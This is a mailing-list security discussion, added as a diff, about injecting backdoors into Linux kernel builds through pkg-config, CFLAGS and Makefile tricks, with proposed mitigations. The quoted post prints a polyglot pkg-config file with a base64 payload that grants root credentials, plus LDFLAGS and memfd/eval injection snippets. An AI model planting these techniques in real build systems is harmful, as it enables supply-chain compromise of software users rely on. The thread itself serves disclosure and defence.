@@ -1,0 +1,321 @@
+
+Date: Wed, 17 Apr 2024 18:55:58 -0500
+From: Jacob Bachmeyer <jcb62281@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: Re: Make your own backdoor: CFLAGS code injection,
+ Makefile injection, pkg-config
+
+Vegard Nossum wrote:
+> Hi all,
+>
+> Given the recent xz/sshd backdoor, I wanted to try to think more like
+> an attacker and build my own backdoor.
+>
+> To start off, I've chosen the Linux kernel as the target for the attack,
+> and I want to do it without changing either the kernel source code or
+> any release tarballs.
+>
+> In other words, the backdoor would have to rely on compromising some
+> _other_ package that gets installed on a distro build server that is used
+> for building the kernel for that particular distro.
+
+Like xz?  (If that attacker had had a little more foresight, we could 
+have a much bigger mess with a bunch of binary-patched kernels floating 
+around.  Got an old boot CD?)
+
+> For my particular backdoor it doesn't really matter which exact package
+> is compromised; all that is required is the existence of a file
+> /usr/lib64/pkgconfig/libelf-uninstalled.pc with mode 755 and containing
+> something along the lines of:
+>
+>   prefix=/usr
+>   exec_prefix=/usr
+>   libdir=/usr/lib64
+>   includedir=/usr/include
+>   f=$objtree/include/config/auto.conf
+>
+> sig=Q0ZMQUdTX3N5cy5vPSctRFNFVF9FTkRJQU4oeCx5KT0tMjIsY29tbWl0X2NyZWRzKCh2b2lkKilpbml0X3Rhc2suY3JlZCknCg== 
+>
+>   grep -q sys.o $f || sed -i "/ELFCORE/a $(echo $sig | base64 -d)" $f; 
+> exit
+>
+>   Name: libelf
+>   Description: elfutils libelf library to read and write ELF files
+>   Version: 0.189
+>   URL: http://elfutils.org/
+>
+>   Libs: -L${libdir} -lelf
+>   Cflags: -I${includedir} 
+> -DLIBELF='$(/usr/lib64/pkgconfig/libelf-uninstalled.pc)'
+>
+>   Requires.private: zlib libzstd
+>
+> (This is based on an existing file for libelf, typically located at 
+> either
+> /usr/lib64/pkgconfig/libelf.pc or
+> /usr/lib/x86_64-linux-gnu/pkgconfig/libelf.pc.)
+
+Well, this looks like you have found a vulnerability in pkg-config 
+here:  pkg-config files declare two types of variables, but your file 
+includes a line ("grep [...]") that is neither of those; pkg-config 
+should reject such a file, very noisily, but evidently does not.
+
+> Now, you could argue that this is easy to spot -- why would a pkg-config
+> file contain base64 data,
+You have hidden it well by disguising it as a cryptographic signature.  
+The catch is that real signatures do /not/ get run through base64.
+> why would an unrelated package contain something
+> that looks like it belongs to libelf, etc. I would argue that the above
+> looks suspicious but not necessarily like a kernel backdoor and could
+> potentially pass for a legitimate file; moreover, that a malicious
+> maintainer could introduce it into a less well-reviewed distro package
+> that happens to be installed by default.
+
+It is extremely suspicious /if/ the use of base64 is noticed.  I suspect 
+that `grep ELFCORE -R /` would reveal that the kernel appears to be 
+targeted.
+
+> [...]
+> I did an end-to-end test on one (unnamed) distro and the backdoor works.
+
+Well, as posted it will not work, but I will assume that you 
+intentionally munged it instead of posting a live toy backdoor.
+
+> I originally attempted to use a file in /etc/bash_completion.d/ or
+> /etc/environment.d/ to set the 'sub_make_done' environment variable to:
+>
+>   $(eval export CFLAGS_sys.o := 
+> "-DSET_ENDIAN(x,y)=-22,commit_creds((void*)init_task.cred)")
+>
+> (which would get evaluated by Make); however, these are not read by
+> non-interactive shells and so likely wouldn't affect a distro's build
+> process -- nevertheless, it demonstrates another pitfall: the fact that
+> Make allows you to override arbitrary build-internal variables with
+> environment variables and that those strings are evaluated as Makefile
+> fragments and can contain essentially arbitrary code (see
+> <https://lore.kernel.org/tech-board-discuss/872f9cfd-5c19-4a82-bf75-6256265e8f8a@oracle.com/> 
+>
+> as well for a bit more on this).
+
+Make does not know what variables are supposed to be build-internal, but 
+there is a way around this in GNU Make *note (make)Override Directive:  
+a variable set with "override" in the Makefile will have the value the 
+Makefile supplies.  The problem is that I suspect (based on its name) 
+that the Linux build scripts expect to pass sub_make_done from a parent 
+make.
+
+> To sum it up, here are some of my takeaways (no doubt known by many
+> others already):
+>
+> - Beware of search paths. pkg-config searches a few different directories
+>   and it may be possible to quietly drop something in that will inject
+>   itself into the build process.
+>
+>   Of course, search paths already have a bit of a reputation and the
+>   other famous ones are PATH and LD_LIBRARY_PATH which are also viable
+>   vectors in this case, assuming you can either influence the list itself
+>   or place a malicious file within one of the earlier components.
+>
+>   I would also consider locales a potential vector -- on my system,
+>   running 'make' searches /usr/share/locale/ as well as
+>   /usr/share/locale-langpack/ and one could imagine a malicious
+>   translation file containing printf formats with %n, for example, to
+>   induce memory errors. (I'm not familiar with the file format, but
+>   depending on how well the parsers have been tested/fuzzed, it might
+>   be possible to do something with intentionally corrupted translation
+>   files as well.)
+
+Trivial:  locales are normally trusted, so it is common to get the 
+format string by calling gettext().  The format string then comes from 
+the message file.  GNU gettext is mostly a very simple string mapping 
+system, so I doubt there is much room for an invalid message file to 
+directly hijack a program, although I have not personally reviewed the code.
+
+But a malicious translation file could do things like causing GPG to say 
+"{good signature}" in the local language when it would have said "BAD 
+signature" in English.
+
+> - Beware of polyglot files. In this case, a pkg-config metadata file
+>   doubled as a shell script. In the xz backdoor, binary test data also
+>   contained shell scripts and object files.
+>
+>   I unfortunately lost the source, but I read somewhere that valid PNG
+>   files can have arbitrary data appended at the end, which seems to be
+>   true in a cursory test. There will undoubtedly be other unexpected
+>   combinations of files that can be used to hide payloads.
+
+Only at the end?  There are chunk types for that in PNG.
+
+> - Speaking of hiding payloads, one could imagine using ANSI escape
+>   sequences (e.g. save + restore cursor location) to hide some parts
+>   of files from being output into a terminal (e.g. cat) -- however, this
+>   is unlikely to be effective for files that are frequently modified
+>   with text editors (i.e. source files). For intermediate/generated
+>   files or typical console output it might not hurt the attacker to try
+>   this to avoid detection.
+
+There may be room for character-set tricks here using names from the 
+broader (non-English-speaking) world.  I wonder if there is any 
+combination of character encodings that could cause a passable name to 
+cause an entire commit to disappear from `git log` output unless 
+carefully handled.
+
+> - Beware of environment variables. Shellshock-style "bash function"
+>   overrides of commands, Makefile injections, search paths, build
+>   flags: these and more can all be used to subtly influence other
+>   programs down the line and often don't really leave a trace in either
+>   source code, object code, or build logs.
+
+This can be easily fixed by running the build using env(1) with a known 
+environment.
+
+>   Apart from CFLAGS, we can also use LDFLAGS to inject a fragment of
+>   Makefile code that checks whether $@ is a particular target, and if
+>   so, includes an additional object file:
+>
+>     $ LDFLAGS='$(if $(filter target,$@),malicious.o,)' make target
+>     cc   malicious.o  target.c   -o target
+
+This would still require getting the malicious.o blob into place.  (This 
+is also a less well hidden and simplified version of exactly what the xz 
+backdoor dropper did.)
+
+> - Eval... since it often means running code that doesn't exist anywhere
+>   as a file (and is thus difficult to capture in SBOM-type solutions).
+>   Shells and Make both have eval.
+>
+> - File descriptors can be useful for passing data around without leaving
+>   a filesystem footprint. We could imagine a malicious shared object
+>   opening a file and later manipulating some command down the line into
+>   using the file descriptor as an input:
+>
+>     fd = memfd_create(...);
+>     write(fd, ...);
+>     dup2(fd, 9);
+>     close(fd);
+>     ...
+>     setenv("CFLAGS", "$(eval $(shell cat <&9))");
+>
+>   Here, CFLAGS would get expanded by 'make', resulting in using the shell
+>   to read from the file and evaluating the result as a Makefile fragment,
+>   while CFLAGS itself would be set to an empty string as long as the
+>   Makefile fragment doesn't output any text.
+
+So env(1) needs to be statically linked for security reasons.  Now the 
+shared object has to be loaded into make if a known environment is used 
+for the build, which greatly reduces the attack surface.
+
+> - Symlinks have a rich history of exploitation and can be used to
+>   temporarily redirect an otherwise legitimate path to malicious content.
+>
+> - __attribute__((constructor)) can be used to run code when a shared
+>   library is loaded and would be fairly easy to inject through CFLAGS
+>   (either using -include or -D)
+
+That reminds me that I still need to check if the xz backdoor blob could 
+have used __attribute__((constructor)) instead of ifunc resolvers.  I 
+suspect that it could, and ifuncs were used to provide a hidden flag to 
+disable the backdoor when building for oss-fuzz.
+
+> - Perhaps the most important takeaway of all is that it's not just a
+>   project's code, not even a project's direct and indirect runtime
+>   dependencies, but ALL its build dependencies as well, that can be used
+>   to inject backdoors. The kernel doesn't depend on any shared libraries
+>   at runtime -- but as long as we can hijack the build process, we can
+>   fairly easily inject code into the compiled kernel.
+>
+>   On my system, a kernel build runs more than 70 different binaries and
+>   loads more than 32 distinct shared libraries. That's a large attack
+>   surface.
+
+This is the "promiscuous dependencies" problem in a nutshell.  This is 
+also a good argument for restricting the kernel to C code, to reduce the 
+build-time attack surface.
+
+> [...]
+>
+> I don't want to make too many recommendations, but here are some that
+> came to mind:
+>
+> 1) We should build software in sanitized, minimal environments. In
+>    particular, GNU Make looks like an easy target due to how it imports
+>    environment variables and evaluates their contents lazily whenever
+>    they are used. Maybe this should be made non-default behaviour.
+
+Again, this can be done today using env(1).
+
+> 2) In general the practice of passing settings and configuration
+>    implicitly through environment variables doesn't seem like a great
+>    idea. Could we sanitize or enforce environment variables through
+>    something like seccomp or landlock? We could imagine the top-level
+>    build process declaring "from here on, any exec() cannot remove or
+>    change CFLAGS" or "from here on, PKG_CONFIG_PATH cannot be set".
+
+The kernel does not really know the environment variables a process is 
+using, only the variables with which it is started, which is to say that 
+environment sandbox policies could only be enforced at exec(2), which 
+would be good enough for what you ask.  This cannot stop a malicious 
+shared object from calling setenv(3), but it could be used to establish 
+policies like "all descendants of this process will start with 
+'CFLAGS=-g -O2 -DXYZ' after any exec(2)" or "no descendant of this 
+process will start with PKG_CONFIG_PATH in its environment after any 
+exec(2)".  Perhaps BPF could be used to evaluate/modify environment 
+arrays at exec(2) time?  Your choice whether to fix the environment to 
+conform or fail the exec with EPERM.
+
+> 3) Distro build systems could output their environment variables at
+>    various stages of the build so they can be audited for any suspicious
+>    variables or values.
+
+I agree, but this should be combined with starting the build with a 
+minimal environment.
+
+> 4) It might be useful to perform builds using overlayfs or landlock so
+>    that ALL other files on the system that are not used for the build
+>    are removed or made inaccessible.
+
+Yes, possibly including making the testsuite and documentation source 
+trees inaccessible while building the main sources.  This would require 
+the package to use recursive make, but would have stopped the xz 
+backdoor in its tracks, since it depended on smuggling a blob hidden in 
+test data into the main build.
+
+> 5) Use separate source and build directories. All source files and
+>    directories must be read-only to prevent tampering during the build.
+
+This would not have stopped the xz backdoor dropper, since it modified 
+the Makefile in the build directory (from config.status, which is 
+*supposed* to write that file) and then replaced objects (from make, 
+which is *supposed* to produce objects), also in the build directory.  
+The tampered sources were piped into the compiler.
+
+This *would* break some packages using GNU Automake, which sometimes 
+wants to rebuild an Info file in the source documentation tree.
+
+> 6) It might be useful to have build systems output straight-line shell
+>    scripts (using no functions or variables) that can be generated and
+>    executed in separate stages (perhaps isolated from each other using
+>    overlayfs or containers) and inspected and diffed. In other words,
+>    separating the build system from the build.
+
+If the Makefiles are carefully written to accommodate this, `make -n` 
+could be used in this way.
+
+> Even if we did all of this, it would of course still not be enough. The
+> underlying problem is having things that are unreadable or 
+> unreviewable --
+> binary files, inscrutable code (whether shell scripts, makefiles, m4 
+> code,
+> or, in some cases, Perl code).
+
+Agreed, although the m4 code used for the xz backdoor dropper would have 
+almost certainly been caught very quickly if it had been brought to the 
+attention of the upstream maintainers for that file.  Very little code 
+is actually inscrutable, but the distributed distribution model used 
+with GNU Autoconf macro sets allowed the cracker to put a modified file 
+into releases that distribution package builders would use.  The problem 
+was that the malicious modifications to m4/build-to-host.m4 went unnoticed.
+
+
+-- Jacob
+
